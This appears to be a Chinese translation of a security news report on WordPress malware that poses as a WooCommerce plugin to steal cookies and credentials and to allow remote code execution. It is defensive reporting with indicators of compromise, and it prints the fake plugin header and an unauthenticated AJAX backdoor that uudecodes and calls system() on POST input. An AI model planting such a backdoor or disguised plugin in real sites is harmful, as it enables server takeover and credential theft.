---
title: 新型 WordPress 恶意软件伪装成具有数据渗入和 RCE 功能的合法插件
url: https://www.anquanke.com/post/id/308086
source: 安全客-有思想的安全新媒体
date: 2025-06-05
fetch_date: 2025-10-06T22:49:33.013050
---

# 新型 WordPress 恶意软件伪装成具有数据渗入和 RCE 功能的合法插件

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 新型 WordPress 恶意软件伪装成具有数据渗入和 RCE 功能的合法插件

阅读量**74901**

发布时间 : 2025-06-04 15:25:46

**x**

##### 译文声明

本文是翻译文章，文章原作者 Ddos，文章来源：securityonline

原文地址：<https://securityonline.info/new-wordpress-malware-masquerades-as-legit-plugin-with-data-exfiltration-and-rce-capabilities/>

译文仅供参考，具体内容表达以及含义原文为准。

![WordPress Malware, Hidden Plugin]()

Wordfence Threat Intelligence团队发现了一个欺骗性且高度持久的WordPress恶意软件变体,该变体将自己伪装成合法的插件 – 包括评论标题,管理UI和多层混淆。尽管外观,这种恶意软件默默地窃取敏感数据,包括登录cookie和管理员凭据,并实现远程代码执行。

*“这个恶意软件包含的代码,确保它仍然隐藏在管理员仪表板中。它具有密码提取功能……基于AJAX的远程代码执行机制和未完成的代码表明它仍在开发中*,“Wordfence解释道。该恶意软件于2025年4月24日在网站清理期间首次发现。

恶意软件位于/wp-contents/plugins/下自己的目录中,并包含似乎是合法的插件头,甚至模仿WooCommerce产品插件等已知插件:

```
<?php
/*
 * Plugin Name: WooCommerce Product Add-ons
 * Plugin URI: https://woocommerce.com/products/product-add-ons/
 * Description: Extend your WooCommerce products with custom fields, checkboxes, dropdowns, and more. Perfect for personalized products.
 * Author: WooCommerce
 * Author URI: https://woocommerce.com/
 * Version: 6.4.0
 * Text Domain: woocommerce-product-addons
 * License: GPLv2 or later
 * Requires PHP: 7.0
 * Requires at least: 5.6
 * WC requires at least: 6.0
 * WC tested up to: 8.0
 */
```

*“我们想强调,这并不意味着WooCommerce插件与恶意软件有任何关系*,”该团队指出。

为了避免检测,恶意软件使用all\_plugins过滤器从WordPress管理界面中的插件页面隐藏自己。

恶意软件配备了一个泄漏机制,可以将敏感的用户数据传输到命令和控制(C2)服务器,其URL存储在WordPress wp\_options表中。

使用 Cookie 和 AJAX 操作,恶意软件会收集:

* + WordPress用户名和电子邮件地址
  + 会话 Cookie

* IP地址和用户代理
* 登录凭据(通过 wp\_login 和 authentication 钩子)

*“cookie可用于劫持用户的会话并代表他们执行操作*,”报告指出。数据通过base64编码和ROT13加密发送到攻击者的服务器,以模糊检测。

恶意软件还注册了一个nopriv AJAX操作,这意味着它可以在没有身份验证的情况下触发:

```
add_action('wp_ajax_nopriv_redacted', function() {
    if (isset($_POST['redacted'])) {
        $class = new ReflectionFunction(convert_uudecode("&<WES=&5M`")); $class->invoke($_POST['redacted']);
    }
});
```

这解码并调用 system() 函数,执行任意 shell 命令。第二个AJAX端点似乎不完整,这意味着恶意软件仍在开发中。

在同一站点清理期间发现的第二个插件使用了略有不同的隐藏技术,并添加了:

* ①JavaScript 注入通过 wp\_enqueue\_scripts
* ②畸形头部注射钩
* ③用于包含服务器端缓存文件的 glob() 调用

*“也许这个代码是由黑客在本地测试的,并以某种方式偷偷潜入这个插件。*

Wordfence建议检查以下IoC:

 ①隐藏的插件文件 /wp-content/plugins/ 在 admin UI 中不可见

②重定向到外部支付网关

③数据库中存在 API\_SN\_CLOUDSERVER 选项

④显示 configure\_cloudserver 参数的访问日志

⑤custom\_reporter\_timer cookie 的存在

本文翻译自securityonline [原文链接](https://securityonline.info/new-wordpress-malware-masquerades-as-legit-plugin-with-data-exfiltration-and-rce-capabilities/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/308086](/post/id/308086)

安全KER - 有思想的安全新媒体

本文转载自: [securityonline](https://securityonline.info/new-wordpress-malware-masquerades-as-legit-plugin-with-data-exfiltration-and-rce-capabilities/)

如若转载,请注明出处： <https://securityonline.info/new-wordpress-malware-masquerades-as-legit-plugin-with-data-exfiltration-and-rce-capabilities/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [漏洞分析](/tag/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)
* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)
* [安全头条](/tag/%E5%AE%89%E5%85%A8%E5%A4%B4%E6%9D%A1)

**+1**0赞

收藏

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p4.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=170061)

[安全客](/member.html?memberId=170061)

这个人太懒了，签名都懒得写一个

* 文章
* **2096**

* 粉丝
* **6**

### TA的文章

* ##### [英国通过数据访问和使用监管法案](/post/id/308719)

  2025-06-20 17:11:10
* ##### [CISA警告：严重缺陷（CVE-2025-5310）暴露加油站设备](/post/id/308715)

  2025-06-20 17:09:03
* ##### [大多数公司高估了AI治理，因为隐私风险激增](/post/id/308708)

  2025-06-20 17:05:02
* ##### [研究人员发现了有史以来最大的数据泄露事件，暴露了160亿个登录凭证](/post/id/308704)

  2025-06-20 17:02:15
* ##### [CVE-2025-6018和CVE-2025-6019漏洞利用：链接本地特权升级缺陷让攻击者获得大多数Linux发行版的根访问权限](/post/id/308701)

  2025-06-20 16:59:36

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)